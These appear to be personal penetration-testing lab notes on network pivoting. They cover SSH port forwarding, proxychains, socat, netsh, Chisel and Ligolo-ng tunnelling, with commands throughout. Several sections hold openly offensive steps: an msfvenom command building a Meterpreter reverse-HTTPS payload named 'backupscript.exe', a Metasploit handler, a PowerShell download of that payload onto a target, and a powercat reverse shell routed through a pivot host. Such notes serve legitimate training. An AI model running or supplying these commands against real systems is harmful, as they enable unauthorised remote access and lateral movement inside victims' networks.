# delete


# Dynamic Port Forwarding with SSH and SOCKS Tunneling
# SSH Local Port Forwarding
```bash
# Forward port 3306 from 10.129.202.64 to localhost 1234
$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

* * *

# Dynamic Port Forwarding
```bash
$ ssh -D 9050 ubuntu@10.129.202.64
```

```bash
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

```bash
$ proxychains nmap -v -sn 172.16.5.1-200
```

* * *

# Remote/Reverse Port Forwarding with SSH
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

```bash
ubuntu@pivot$ python3 -m http.server 8123
```

```powershell
PS > Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

```bash
$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

* * *

# [Socat](https://linux.die.net/man/1/socat) Redirection
## Reverse Shell
```bash
# On pivot machine
$ socat TCP4-LISTEN:<FORWARD_PORT>,fork TCP4:<OUR_IP:OUR_PORT>
```

- Generate reverse msfvenom payload set LHOST has the pivot machine and LPORT FORWARD_PORT
- Set LHOST = 0.0.0.0 on msfconsole and LPORT = <OUR_PORT>

## Bind Shell

- Generate reverse msfvenom payload set LHOST has the pivot machine
- Set LHOST = 0.0.0.0 on msfconsole

* * *

# Port Forwarding with Windows Netsh
```
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

* * *

# SOCKS5 Tunneling with Chisel
`Find PID to kill`
```bash
$ lsof -i:8080 
```


```bash
# Local Machine
$ chisel server --socks5 --reverse`

# Remote machine
./chisel client --fingerprint f9KLbYov18MaH86fvgZhbVMyTAj4LAT6Iv8E8Nlwy0k= 10.10.15.23:8080 R:8081:127.0.0.1:445
```

* * *

# [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)

[Guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
[Video](https://www.youtube.com/watch?v=qou7shRlX_s)


```bash
# Proxy (Attack)
$ sudo ip tuntap add user [your_username] mode tun ligolo

$ sudo ip link set ligolo up

$ ./proxy -selfcert
$ ./proxy -autocert
```



```powershell
# Target
> ./agent -connect 10.10.15.184:11601 --ignore-cert
```

```bash
# Attack
session

[Agent : ubuntu@WEB01] » ifconfig

[Agent : ubuntu@WEB01] » start
```

[IPCalculator](https://jodies.de/ipcalc)
```bash
$ sudo ip route add 172.16.4.0/23 dev ligolo
```

## Download and Upload files from and to Target
```bash
# Redirect 8080 on Target machine to our Attack 8080 to upload files to it 
» listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp

# Redirect 8000 on Target machine to our Attack 8000 to download files from it 
» listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
```

## Reverse Shell Target Machine to Attack Machine
```bash
# Attack
[Agent : session] » listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp

$ nc -lnvp 10000
```


```powershell
# Target
https://github.com/besimorhino/powercat/blob/master/powercat.ps1

Copy into powershell

> powercat -c (Internal Pivot Machine Interface) -p 30000 -ep
```

## Double Pivot[https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c]
- https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/


After access to first machine or pivot, if exists another network we can also pivot to it.

First we need to put agent on pivot machine, for it we need to open a port on our attack machine and add a listener on pivot machine to redirect from port 8080 to our local port 9999.

### Upload Agent to Pivot
> Open port to pass our http server

```bash
# Attack
[Agent : session] » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:9999 --tcp
``` 

```bash
# Target
Download agent file from (Internal Pivot Machine Interface):8080
```

```bash
# Attack
$ sudo ip tuntap add user [your_username] mode tun ligoloSec

$ sudo ip link set ligoloSec up

$ sudo ip route add 172.16.5.155 dev ligoloSec

[Agent : session] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

```powershell
# Target
> ./agent -connect (Internal Pivot Machine Interface):11601 --ignore-cert
```

```bash
# Attack
[Agent : session] » start --tun ligoloSec
```


## Forward Ports from Pivot Machine to Attack Machine
```bash
$ sudo ip route add 240.0.0.1/32 dev ligolo
```
